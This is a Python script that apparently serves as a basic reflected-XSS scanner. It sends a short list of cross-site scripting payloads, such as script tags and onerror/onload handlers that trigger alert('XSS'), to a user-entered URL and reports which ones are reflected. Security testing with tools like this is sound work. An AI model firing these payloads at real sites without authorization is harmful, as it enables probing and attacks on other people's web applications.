import requests
import urllib.parse
import time

# List of test payloads, including an encoded variant
payloads = [
    '<script>alert("XSS");</script>',                  # Basic script tag
    '<img src=x onerror=alert("XSS")>',               # Image error event
    '<svg onload=alert("XSS")>',                       # SVG onload event
    '%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E', # URL-encoded script tag
    '<body onload=alert("XSS")>',                      # Body onload event
]

def test_reflected_xss(url, payload):
    """Submit a payload to the URL and check for reflected input."""
    try:
        # Send the payload as a GET parameter
        response = requests.get(url, params={'input': payload}, timeout=5)
        
        if response.status_code == 200:
            # Check if the payload or its decoded version is reflected in the response
            if (payload in response.text or 
                urllib.parse.unquote(payload) in response.text):
                return True
        return False
    except (requests.exceptions.Timeout, requests.exceptions.RequestException) as e:
        print(f"Error with payload '{payload}': {e}")
        return False

def main():
    # The target URL for testing
    target_url = input("Enter the target URL for XSS testing: ").strip()
    
    # Summary of results
    vulnerable_count = 0
    total_payloads = len(payloads)

    print(f"\nTesting for reflected XSS vulnerabilities on: {target_url}\n")
    
    for payload in payloads:
        print(f"Testing payload: {payload}")
        time.sleep(1)  # To avoid overwhelming the server with requests

        if test_reflected_xss(target_url, payload):
            print(f"Payload '{payload}' is vulnerable.")
            vulnerable_count += 1
        else:
            print(f"Payload '{payload}' is not vulnerable.")

    # Summary of findings
    print(f"\nSummary: {vulnerable_count} of {total_payloads} payloads flagged as vulnerable.")

if __name__ == "__main__":
    main()